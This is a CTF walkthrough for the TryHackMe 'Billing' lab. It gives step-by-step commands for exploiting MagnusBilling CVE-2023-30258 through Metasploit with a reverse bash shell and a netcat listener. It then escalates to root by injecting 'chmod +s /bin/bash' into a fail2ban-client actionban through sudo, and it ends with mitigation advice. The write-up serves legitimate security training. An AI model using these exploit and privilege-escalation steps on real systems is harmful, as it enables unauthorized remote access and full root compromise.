# TryHackMe: Billing Writeup (Walkthrough)

A comprehensive walkthrough for the **Billing** machine on TryHackMe. This lab covers initial access via an unauthenticated Remote Code Execution (RCE) vulnerability and local privilege escalation using a misconfigured `fail2ban-client`.

---

## Machine Overview

- **Machine Name:** Billing
- **OS:** Linux
- **Difficulty:** Medium
- **Target IP:** `10.10.x.x` (Replace with your target IP)
- **Vulnerability:** Unauthenticated RCE & Privilege Escalation via Fail2Ban

---

## Phase 1: Reconnaissance & Enumeration

### Nmap Scan
We start by scanning the target machine to identify open ports and running services.

```bash
nmap -sV -sC -A -v <TARGET_IP>
```

**Scan Results:**
```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey:
|   256 a0:0f:9d:34:f5:86:5a:85:bd:bd:93:a8:18:ac:16:f3 (ECDSA)
|_  256 c9:80:47:70:ac:66:ae:d1:78:95:8c:25:b6:69:6c:89 (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Did not follow redirect to ./mbilling
|_http-server-header: Apache/2.4.62 (Debian)
| http-robots.txt: 1 disallowed entry
|_/mbilling/
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Discovered Attack Surfaces:
1. **Port 22:** OpenSSH 9.2p1
2. **Port 80:** Apache httpd 2.4.62 (Redirects to `/mbilling` login page)
3. **Port 3306:** MariaDB 10.3.23 (Access unauthorized)

---

## Phase 2: Web Enumeration & Initial Access

Navigating to `http://<TARGET_IP>/` redirects us to the **MagnusBilling** login dashboard. 

### Directory Fuzzing (Optional Learning Step)
We can perform directory fuzzing using `ffuf` to understand the application structure:
```bash
ffuf -u http://<TARGET_IP>/FUZZ -w /path/to/wordlists/dirb/common.txt
```
*Note: While directory fuzzing reveals several paths, the main entry point relies on an outdated software component.*

### Exploitation: MagnusBilling Unauthenticated RCE (CVE-2023-30258)
Researching the MagnusBilling application version reveals a critical vulnerability: **CVE-2023-30258**, which allows unauthenticated Remote Code Execution.

We can exploit this efficiently using Metasploit.

1. Launch Metasploit:
   ```bash
   msfconsole
   ```
2. Select the exploit module:
   ```text
   use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
   ```
3. Set the payload type:
   ```text
   set PAYLOAD php/unix/cmd/reverse_bash
   ```
4. Configure target and local parameters:
   ```text
   set RHOSTS <TARGET_IP>
   set LHOST <YOUR_IP>
   set LPORT <YOUR_PORT>
   ```
5. Set up a netcat listener in a separate terminal tab:
   ```bash
   nc -lvnp <YOUR_PORT>
   ```
6. Execute the exploit within Metasploit:
   ```text
   run
   ```

### Post-Exploitation (User Flag)
Once the reverse shell connects, verify your current privileges:
```bash
id
# Output: uid=1001(asterisk) gid=1001(asterisk)
```

Locate and read the user flag:
```bash
find / -type f -name "user.txt" 2>/dev/null
cat /home/magnus/user.txt
```
> **User Flag:** `THM{CENSORED}`

---

## Phase 3: Privilege Escalation (PrivEsc)

### System Enumeration
Check allowed sudo commands for the current user:
```bash
sudo -l
```

**Output:**
```text
User asterisk may run the following commands on ip-10-130-179-1:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```
The `asterisk` user can run `/usr/bin/fail2ban-client` as `root` without providing a password.

Check the Fail2Ban version:
```bash
sudo /usr/bin/fail2ban-client --version
# Output: Fail2Ban v1.0.2
```

### The Fail2Ban v1.0.2 Privilege Escalation Vector
In Fail2Ban v1.0.2, if a user has `sudo` access to `fail2ban-client`, they can register a new action and override the `actionban` directive. Because the background Fail2Ban server daemon runs as `root`, any custom command inside `actionban` will be executed with root privileges when an IP is banned.

### Step-by-Step Exploitation

1. **List active jails:**
   ```bash
   sudo /usr/bin/fail2ban-client status
   ```
   *We identify the active jail named `ast-cli-attck`.*

2. **Register a new custom action named `evil` for that jail:**
   ```bash
   sudo /usr/bin/fail2ban-client set ast-cli-attck addaction evil
   ```

3. **Inject the SUID payload into the `actionban` trigger:**
   We configure the action to assign the SUID bit (`+s`) to the native system `/bin/bash` binary when executed:
   ```bash
   sudo /usr/bin/fail2ban-client set ast-cli-attck action evil actionban "chmod +s /bin/bash"
   ```

4. **Trigger the ban event manually:**
   We force-ban a random IP address to immediately trigger the `actionban` directive:
   ```bash
   sudo /usr/bin/fail2ban-client set ast-cli-attck banip 1.2.3.5
   ```

5. **Spawn the Root Shell:**
   Execute bash with the `-p` flag to preserve the elevated SUID privileges:
   ```bash
   /bin/bash -p
   ```

6. **Verify Root Access:**
   ```bash
   id
   # Output: uid=1001(asterisk) gid=1001(asterisk) euid=0(root) egid=0(root)
   
   whoami
   # Output: root
   ```

### Root Flag
Read the root flag from the root directory:
```bash
cat /root/root.txt
```
> **Root Flag:** `THM{CENSORED}`

---

##Mitigation Recommendations

1. **Restrict Sudoers Configuration:** Avoid granting complete binary execution rights to administrative clients like `fail2ban-client` inside `/etc/sudoers`. Restrict access to read-only subcommands (e.g., `status`, `ping`) using explicit command definitions.
2. **Patch Management:** Upgrade software components regularly to resolve known execution issues like CVE-2023-30258.
